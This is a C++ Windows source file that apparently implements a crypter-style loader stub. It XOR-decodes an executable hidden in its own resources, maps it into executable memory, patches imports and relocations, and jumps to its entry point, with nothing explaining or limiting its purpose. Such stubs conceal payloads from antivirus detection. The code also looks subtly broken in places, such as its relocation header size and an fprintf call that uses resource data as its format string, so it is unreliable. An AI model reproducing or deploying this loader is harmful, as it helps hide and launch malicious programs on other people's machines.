// kyoungsoft_new.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "kyoungsoft_new.h"

#define MAX_LOADSTRING 100

// Global Variables:
#include <windows.h>
#include <stdio.h>
#include <TlHelp32.h> 
#include "resource.h"
#ifdef _WIN64
typedef IMAGE_NT_HEADERS64  IMAGE_NT_HEADERS;
typedef PIMAGE_NT_HEADERS64 PIMAGE_NT_HEADERS;
typedef IMAGE_OPTIONAL_HEADER64 IMAGE_OPTIONAL_HEADER;
typedef PIMAGE_OPTIONAL_HEADER64 PIMAGE_OPTIONAL_HEADER;
#else
typedef IMAGE_NT_HEADERS32  IMAGE_NT_HEADERS;
typedef PIMAGE_NT_HEADERS32 PIMAGE_NT_HEADERS;
typedef IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER;
typedef PIMAGE_OPTIONAL_HEADER32 PIMAGE_OPTIONAL_HEADER;
#endif 


VOID FixImageIAT(PIMAGE_DOS_HEADER dos_header, PIMAGE_NT_HEADERS nt_header)
{
	PIMAGE_THUNK_DATA thunk;
	PIMAGE_THUNK_DATA fixup;
	DWORD iat_rva;
	SIZE_T iat_size;
	HMODULE import_base;
	PIMAGE_IMPORT_DESCRIPTOR import_table =
		(PIMAGE_IMPORT_DESCRIPTOR)(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress +
		(UINT_PTR)dos_header);

	DWORD iat_loc =
		(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress) ?
		IMAGE_DIRECTORY_ENTRY_IAT :
		IMAGE_DIRECTORY_ENTRY_IMPORT;

	iat_rva = nt_header->OptionalHeader.DataDirectory[iat_loc].VirtualAddress;
	iat_size = nt_header->OptionalHeader.DataDirectory[iat_loc].Size;

	LPVOID iat = (LPVOID)(iat_rva + (UINT_PTR)dos_header);
	DWORD op;
	VirtualProtect(iat, iat_size, PAGE_READWRITE, &op);
	__try {
		while (import_table->Name) {
			import_base = LoadLibraryA((LPCSTR)(import_table->Name + (UINT_PTR)dos_header));
			fixup = (PIMAGE_THUNK_DATA)(import_table->FirstThunk + (UINT_PTR)dos_header);
			if (import_table->OriginalFirstThunk) {
				thunk = (PIMAGE_THUNK_DATA)(import_table->OriginalFirstThunk + (UINT_PTR)dos_header);
			}
			else {
				thunk = (PIMAGE_THUNK_DATA)(import_table->FirstThunk + (UINT_PTR)dos_header);
			}

			while (thunk->u1.Function) {
				PCHAR func_name;
				if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
					fixup->u1.Function =
						(UINT_PTR)GetProcAddress(import_base, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));

				}
				else {
					func_name =
						(PCHAR)(((PIMAGE_IMPORT_BY_NAME)(thunk->u1.AddressOfData))->Name + (UINT_PTR)dos_header);
					fixup->u1.Function = (UINT_PTR)GetProcAddress(import_base, func_name);
				}
				fixup++;
				thunk++;
			}
			import_table++;
		}
	}
	__except (1) {

	}
	return;
}



//works with manually mapped files
HANDLE GetImageActCtx(HMODULE module)
{
	char temp_path[MAX_PATH];
	char temp_filename[MAX_PATH];
	for (int i = 1; i <= 3; i++) {
		HRSRC resource_info = FindResource(module, MAKEINTRESOURCE(i), RT_MANIFEST);
		if (resource_info) {
			HGLOBAL resource = LoadResource(module, resource_info);
			DWORD resource_size = SizeofResource(module, resource_info);
			const PBYTE resource_data = (const PBYTE)LockResource(resource);
			if (resource_data && resource_size) {
				FILE *fp;
				errno_t err;
				DWORD ret_val = GetTempPath(MAX_PATH, temp_path);

				if (0 == GetTempFileName(temp_path, "manifest.tmp", 0, temp_filename))
					return NULL;

				err = fopen_s(&fp, temp_filename, "w");

				if (errno)
					return NULL;

				fprintf(fp, (char*)resource_data);
				fclose(fp);
				break;
			}
			else {
				return NULL;
			}
		}
	}

	ACTCTX act = { sizeof(act) };
	act.lpSource = temp_filename;
	return CreateActCtx(&act);
}

LPVOID MapImageToMemory(LPVOID base_addr)
{
	LPVOID mem_image_base = NULL;
	__try {

		PIMAGE_DOS_HEADER raw_image_base = (PIMAGE_DOS_HEADER)base_addr;

		if (IMAGE_DOS_SIGNATURE != raw_image_base->e_magic)
			return NULL;

		PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(raw_image_base->e_lfanew + (UINT_PTR)raw_image_base);
		if (IMAGE_NT_SIGNATURE != nt_header->Signature)
			return NULL;

		//only 64bit modules will be loaded
		if (IMAGE_FILE_MACHINE_AMD64 != nt_header->FileHeader.Machine)
			return NULL;

		//Not going to bother with .net
		if (nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress)
			return NULL;

		PIMAGE_SECTION_HEADER section_header =
			(PIMAGE_SECTION_HEADER)(raw_image_base->e_lfanew + sizeof(*nt_header) + (UINT_PTR)raw_image_base);

		mem_image_base = VirtualAlloc(
			(LPVOID)(nt_header->OptionalHeader.ImageBase),
			nt_header->OptionalHeader.SizeOfImage,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE);

		if (NULL == mem_image_base) {
			mem_image_base = VirtualAlloc(
				NULL,
				nt_header->OptionalHeader.SizeOfImage,
				MEM_COMMIT | MEM_RESERVE,
				PAGE_EXECUTE_READWRITE);
		}

		if (NULL == mem_image_base)
			return NULL;

		memcpy(mem_image_base, (LPVOID)raw_image_base, nt_header->OptionalHeader.SizeOfHeaders);

		for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
			memcpy(
				(LPVOID)(section_header->VirtualAddress + (UINT_PTR)mem_image_base),
				(LPVOID)(section_header->PointerToRawData + (UINT_PTR)raw_image_base),
				section_header->SizeOfRawData);
			section_header++;
		}
	}
	__except (1) {

	}
	return mem_image_base;
}

BOOL FixImageRelocations(PIMAGE_DOS_HEADER dos_header, PIMAGE_NT_HEADERS nt_header, ULONG_PTR delta)
{
	ULONG_PTR size;
	PULONG_PTR intruction;
	PIMAGE_BASE_RELOCATION reloc_block =
		(PIMAGE_BASE_RELOCATION)(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress +
		(UINT_PTR)dos_header);

	while (reloc_block->VirtualAddress) {
		size = (reloc_block->SizeOfBlock - sizeof(reloc_block)) / sizeof(WORD);
		PWORD fixup = (PWORD)((ULONG_PTR)reloc_block + sizeof(reloc_block));
		for (int i = 0; i < size; i++, fixup++) {
			if (IMAGE_REL_BASED_DIR64 == *fixup >> 12) {
				intruction = (PULONG_PTR)(reloc_block->VirtualAddress + (ULONG_PTR)dos_header + (*fixup & 0xfff));
				*intruction += delta;
			}
		}
		reloc_block = (PIMAGE_BASE_RELOCATION)(reloc_block->SizeOfBlock + (ULONG_PTR)reloc_block);
	}
	return TRUE;
}


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{

	HRSRC myResource = ::FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	unsigned int myResourceSize = ::SizeofResource(NULL, myResource);
	HGLOBAL myResourceData = ::LoadResource(NULL, myResource);
	void* pMyBinaryData = ::LockResource(myResourceData);

	char* buffer = new char[myResourceSize];
	memcpy(buffer, pMyBinaryData, myResourceSize);

	int key = 128;
	for (int i = 0; i < myResourceSize; i++) {
		buffer[i] ^= key;
	}

	//RunPortableExecutable(buffer); // run executable from the array
	//std::cin.get();


	PIMAGE_DOS_HEADER image_base = (PIMAGE_DOS_HEADER)MapImageToMemory((LPVOID)buffer);
	//PIMAGE_DOS_HEADER image_base = (PIMAGE_DOS_HEADER)MapImageToMemory(NULL);//not working with some files like notepad etc
	//PIMAGE_DOS_HEADER image_base = (PIMAGE_DOS_HEADER)LoadLibrary("E:/TEMP/crypt.exe");//works
	if (!image_base) {
		return 1;
	}

	PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(image_base->e_lfanew + (UINT_PTR)image_base);
	HANDLE actctx = NULL;
	UINT_PTR cookie = 0;
	BOOL changed_ctx = FALSE;
	if (nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress) {
		actctx = GetImageActCtx((HMODULE)image_base);
		if (actctx)
			changed_ctx = ActivateActCtx(actctx, &cookie);
	}

	FixImageIAT(image_base, nt_header);

	if (nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) {
		ptrdiff_t delta = (ptrdiff_t)((PBYTE)image_base - (PBYTE)nt_header->OptionalHeader.ImageBase);
		if (delta)
			FixImageRelocations(image_base, nt_header, delta);
	}

	LPVOID oep = (LPVOID)(nt_header->OptionalHeader.AddressOfEntryPoint + (UINT_PTR)image_base);
	((void(*)())(oep))();
	//DWORD tid;
	//PCONTEXT ctx;
	//CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)oep, NULL, 0, &tid);

	if (changed_ctx) {
		DeactivateActCtx(0, cookie);
		ReleaseActCtx(actctx);
	}


    return (int) 0;
}

